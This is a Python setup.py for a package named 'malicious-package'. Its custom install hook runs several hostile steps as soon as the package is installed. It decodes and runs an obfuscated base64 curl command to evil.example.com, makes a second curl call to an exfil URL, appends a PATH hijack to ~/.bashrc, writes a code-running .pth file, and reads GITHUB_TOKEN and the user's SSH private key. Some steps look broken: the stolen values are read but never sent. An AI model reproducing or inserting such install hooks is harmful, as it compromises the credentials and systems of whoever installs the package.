import os
import base64
import subprocess
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        payload = base64.b64decode("Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWw=")
        os.system(payload.decode())
        subprocess.Popen(["curl", "https://evil.example.com/exfil"], shell=True)
        home = os.path.expanduser("~")
        with open(os.path.join(home, ".bashrc"), "a") as f:
            f.write("\nexport PATH=/tmp/evil:$PATH\n")
        with open("/tmp/evil.pth", "w") as f:
            f.write("import os; os.system('whoami')\n")
        token = os.environ.get("GITHUB_TOKEN", "")
        ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()

setup(
    name="malicious-package",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
